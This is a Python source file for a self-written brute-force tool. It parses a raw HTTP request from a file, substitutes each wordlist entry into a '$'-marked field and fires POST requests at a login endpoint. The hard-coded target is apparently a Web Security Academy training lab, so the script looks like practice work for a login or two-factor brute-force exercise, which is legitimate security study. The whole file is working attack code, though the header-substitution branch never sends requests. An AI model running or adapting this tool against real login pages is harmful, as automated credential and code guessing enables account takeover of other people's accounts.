import re
import requests



http_header_regex = '([\w-]+): '

#string between two '$' sign
string_to_change_regex = '(\$.*?\$)'

url = 'https://0a3500960335e87ec07ca5ae004a00ae.web-security-academy.net/login2'

#http payload file
payload_file = 'payload.txt'

#wordlist to bruteforce
wordlist_file = 'wordlist.txt'


headers_and_its_values = {}

#http post data as a dictionary
parsed_data = {}

#the first line of http request
request_line = []


def get_first_line():
    '''Getting the first line of http payload. It should be method, requested directory, and http version.
       The function just reads the first line of the payload file.
       For example: POST /login HTTP/1.1
    '''
    global request_line
    
    with open(payload_file, 'r') as file:
        request_line = file.readline()


def add_headers_to_dictionary():
    '''The function opens the payload file and checks all line for the header regex. If regex matches then the line is divided two peaces based on ": ".
       And these peaces of string is added to dictionary as a key-value pair.
       For example: {'Host': 'example.com', 'Connection': 'Close'}    
    '''
    with open(payload_file, 'r') as file:
        for line in file:

            #regex filter applied to get only headers not request line or body of the http request
            if(re.search(http_header_regex, line)):
                line = line.replace('\n','').replace('\t','')
                splited_line = line.split(': ')
                headers_and_its_values[splited_line[0]] = splited_line[1]
                

def parse_post_data_to_dictionary(data):
    '''The function gets "data" parameter which is the data line of the payload file. And then adds parameters and its values to dictionary
       For example:     data: username=user&password=password&id=1 ==> {'username': 'user1', 'password': 'password', 'id': '1'}
    '''

    #{'username': 'user1', 'password': 'password'}
    parameter_value_as_dict = {}

    #['username=user', 'password=password']
    unsiplitted_parameters_and_values = data.split('&')


    for unsiplitted_parameter_and_value in unsiplitted_parameters_and_values:
        splitted_parameter_and_value = unsiplitted_parameter_and_value.split('=')
        parameter_value_as_dict[splitted_parameter_and_value[0]] = splitted_parameter_and_value[1]


    for key in parameter_value_as_dict:
        parameter_value_as_dict[key] = parameter_value_as_dict[key].replace('\n','')
        

    return parameter_value_as_dict


def get_post_data_from_file():
    '''Functions reads chars after "\n" as many as described in Content-Length header and then returns this line'''

    content_length = int(headers_and_its_values['Content-Length'])

    with open(payload_file, 'r') as file:
        for line in file:
            if(line == '\n'):
                data = file.read(content_length +2)
                print(data)

    return data


def find_character_count(string):
    '''Finding the count of "$" sign. This function used by another function. The aim is that: The count of sign should be 2. If count is two
       it means the line which we are trying to edit is this line.
    '''

    count_of_caracter = 0

    for character in string:
        if(character == '$'):
            count_of_caracter = count_of_caracter + 1

    return count_of_caracter


def find_change_line():
    '''Finds the line which should be changed and returns the type of line. The line can be first line, header lines or data line.'''

    with open(payload_file, 'r') as file:
        for line in file:
            if(find_character_count(line) == 2):
                match = re.findall(http_header_regex, line)
                if(match):
                    return ['header', match[0]]
                elif('HTTP' in line):
                    return ['first_line', line]
                else:
                    return ['data', line]


def change_request_payload(change_line, word, original_value_of_line):
    '''Original_value_of_line is the copy of line type which we want to change. The function uses this parameter for determining original change point.
       Depending on type of the line, change operation differ.
    '''

    if(change_line[0] == 'header'):
        string_to_change = re.findall(string_to_change_regex, original_value_of_line)
        headers_and_its_values[change_line[1]] = original_value_of_line.replace(string_to_change[0], word)
    elif(change_line[0] == 'data'):
        for key in parsed_data:
            string_to_change = re.findall(string_to_change_regex, original_value_of_line[key])
            if(len(string_to_change)!= 0):
                parsed_data[key] = original_value_of_line[key].replace(string_to_change[0],word)
    elif(change_line[0] == 'first_line'):
        pass


def bruteforce():
    '''Depending on the type of the line which we want to change function passes argumetns to change function. Then using changed line and other 
       headers sends http request
    '''
    
    global wordlist_file
    change_line = find_change_line()

    if(change_line[0] == 'header'):
        original_value_of_line = headers_and_its_values[change_line[1]]
        with open(wordlist_file, 'r') as wordlist_file:
            for word in wordlist_file:
                word = word.replace('\n', '')
                change_request_payload(change_line, word, original_value_of_line)
    elif(change_line[0] == 'data'):

        #ATTENTION
        original_value_of_line = parsed_data.copy()

        with open(wordlist_file, 'r') as wordlist_file:
            for word in wordlist_file:
                word = word.replace('\n', '')
                change_request_payload(change_line, word, original_value_of_line)

                response = requests.post(url, data=parsed_data, headers=headers_and_its_values, timeout=4)

                print(response, '  ----------------->  ', word)

    elif(change_line[0] == 'first_line'):
        pass


def main():

    global parsed_data

    get_first_line()
    add_headers_to_dictionary()
    data= get_post_data_from_file()
    parsed_data = parse_post_data_to_dictionary(data)
    find_change_line()

    bruteforce()


if __name__ == '__main__':
    main()
